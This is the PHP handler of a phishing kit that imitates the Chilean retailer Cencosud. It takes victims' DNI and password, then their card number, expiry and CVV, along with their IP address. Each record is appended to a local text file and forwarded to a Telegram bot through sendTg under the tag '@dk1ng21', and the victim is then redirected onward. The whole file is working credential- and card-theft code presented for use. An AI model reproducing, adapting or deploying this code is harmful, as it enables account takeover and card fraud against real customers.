<?php
error_reporting(0);
include '../config.php';
include './tg.php';
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_POST['dcaf'])) {
    $msg  = "➖➖➖[ CENCOSUD ]➖➖➖\r\n";
    $msg .= "✔️ DNI : {$_POST['dcaf']}\r\n";
    $msg .= "✔️ Contraseña : {$_POST['codfa']}\r\n";
    $msg .= "➖➖➖➖INFO➖➖➖➖\r\n";
    $msg .= "🌐 Client IP : ".$ip."\r\n";
    $msg .= "➖➖➖➖[@dk1ng21]➖➖➖➖\r\n\r\n\r\n";
    $save = fopen("../".$txt.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    header("location: ../index2.html ");
    sendTg($msg, $key, $id);
}
if (isset($_POST['dikm'])) {
    $msg  = "➖➖➖[ CENCOSUD ]➖➖➖\r\n";
    $msg .= "✔️ CC : {$_POST['dikm']}\r\n";
    $msg .= "✔️ VENCIMIENTO : {$_POST['sfad']}\r\n";
    $msg .= "✔️ CVV : {$_POST['fasfdd']}\r\n";
    $msg .= "➖➖➖➖INFO➖➖➖➖\r\n";
    $msg .= "🌐 Client IP : ".$ip."\r\n";
    $msg .= "➖➖➖➖[@dk1ng21]➖➖➖➖\r\n\r\n\r\n";
    $save = fopen("../".$txt.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    header("location:  $out");
    sendTg($msg, $key, $id);
}
?>